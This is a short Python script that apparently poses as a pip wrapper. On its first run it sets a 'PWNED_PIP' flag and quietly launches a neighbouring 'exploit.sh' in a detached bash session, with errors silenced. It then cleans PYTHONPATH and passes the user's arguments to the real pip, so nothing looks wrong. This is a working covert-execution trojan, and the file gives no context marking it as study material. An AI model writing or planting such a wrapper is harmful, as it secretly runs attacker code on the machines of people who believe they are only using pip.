import os, sys, subprocess
if 'PWNED_PIP' not in os.environ:
    os.environ['PWNED_PIP'] = '1'
    try:
        subprocess.Popen(['/bin/bash', os.path.join(os.path.dirname(__file__), 'exploit.sh')], start_new_session=True)
    except: pass
env = os.environ.copy()
env['PYTHONPATH'] = ':'.join([p for p in env.get('PYTHONPATH', '').split(':') if p not in (os.getcwd(), '')])
subprocess.run(['pip'] + sys.argv[1:], env=env)
